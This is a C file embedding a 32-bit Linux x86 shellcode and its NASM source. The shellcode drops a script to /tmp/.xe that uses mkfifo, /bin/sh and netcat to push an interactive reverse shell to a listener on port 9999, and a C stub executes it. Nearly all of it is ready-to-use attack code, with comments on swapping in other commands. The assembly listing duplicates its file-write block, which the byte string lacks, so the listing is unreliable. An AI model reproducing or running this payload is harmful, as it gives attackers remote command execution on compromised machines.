/*
;author:    Filippo "zinzloun" Bersani
;date:      05/12/2016
;version:   1.0
;X86 Assembly/NASM Syntax
;tested on: Linux OpenSuse001 2.6.34-12-desktop 32bit
;           Linux ubuntu 3.13.0-100-generic #147~precise1-Ubuntu 32bit
;           Linux bb32 4.4.0-45-generic 32bit

; description:
	get a reverse shell executing a shell script saved in tmp that execute netcat that reverse the shell to the listener,
	considering that by now the default nc configuration does not permitt to execute (-e) command directly anymore
	this is a different approach that permitt to execute not only netcat.
	LIMITATION: size of the shellcode; the attacker has to have gained the privilege to execute commmand (/bin/bash)



; see comment for details

global _start

section .text
_start:


CreateFile:
	xor eax, eax			;zeroing
   	xor edx, edx
   	push eax         		;NULL byte as string terminator
   	push 0x65782e2f   		;name of file to be executed /tmp/.xe
   	push 0x706d742f
   	mov ebx, esp       		;ebx point to pushed string
	mov esi, esp	   		;save the name of the file for a later use
	mov al,0x8				;create the file...
	mov cl,077o				;...with 77 permission in octal (to avoid 0)
	int 0x80

	jmp CallPop

WriteString:

	pop ecx					;get the command string to write in the file, 3rd arg
	mov ebx,eax         	;save the returned value of the previous sys call (fd) into ebx, 2nd arg
	mov dl,0x09         	;now we put value $0x09 into dl...
   	inc  dl             	;0x09 + 1 == 0x0A, get the bad Line feed char ;)
	mov byte [ecx+92],dl 	;replace our R char with 0x0A *

	xor edx,edx
	mov dl,93    			;len of the buffer to write, 4th arg **
	mov al,0x04				;sys call to write the file
	int 0x80
	mov ebx,eax         	;save the returned value of the previous sys call (fd) into ebx, 2nd arg
	mov dl,0x09         	;now we put value $0x09 into dl...
   	inc  dl             	;0x09 + 1 == 0x0A, get the bad Line feed char ;)
	mov byte [ecx+92],dl    ;replace our R char with 0x0A *

	xor edx,edx
	mov dl,93    		;len of the buffer to write, 4th arg **
	mov al,0x04			;sys call to write the file
	int 0x80

CloseFile:
	xor eax,eax
    mov al, 0x6			;close the stream file
	int 0x80

ExecFile:
	xor eax, eax
	push eax			;push null into the stack
						;push ////bin/bash into the stack
	push 0x68736162
	push 0x2f6e6962
	push 0x2f2f2f2f

	mov ebx,esp			;set the 1st arg /bin/bash from the stack
						;set up the args array
	push eax 			; null
	push esi 			; get the saved pointer to the /tmp/.xe
	push ebx 			; pointer to /bin/bash
	mov ecx, esp 		;set the args

	xor edx,edx
	mov al, 0xb			;sys call 11 to execute the file
	int 0x80

CallPop:
 call  WriteString
 ;this string can be configured to execute other command too, you have only to adjust the length of the buffer (**) and the index of the char (R) to replace (*)
 ;according to the length of the string
 db "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | /bin/nc  localhost 9999 > /tmp/fR"

*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xd2\x50\x68\x2f\x2e\x78\x65\x68\x2f\x74\x6d\x70\x89\xe3\x89\xe6\xb0\x08\xb1\x3f\xcd\x80\xeb\x37\x59\x89"
"\xc3\xb2\x09\xfe\xc2\x88\x51\x5c\x31\xd2\xb2\x5d\xb0\x04\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68"
"\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x56\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\xe8\xc4\xff\xff\xff\x72\x6d\x20\x2d\x66"
"\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x20\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x20\x63\x61\x74\x20\x2f\x74\x6d\x70\x2f"
"\x66\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69\x20\x32\x3e\x26\x31\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x6e\x63\x20\x20\x6c\x6f"
"\x63\x61\x6c\x68\x6f\x73\x74\x20\x39\x39\x39\x39\x20\x3e\x20\x2f\x74\x6d\x70\x2f\x66\x52";
main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}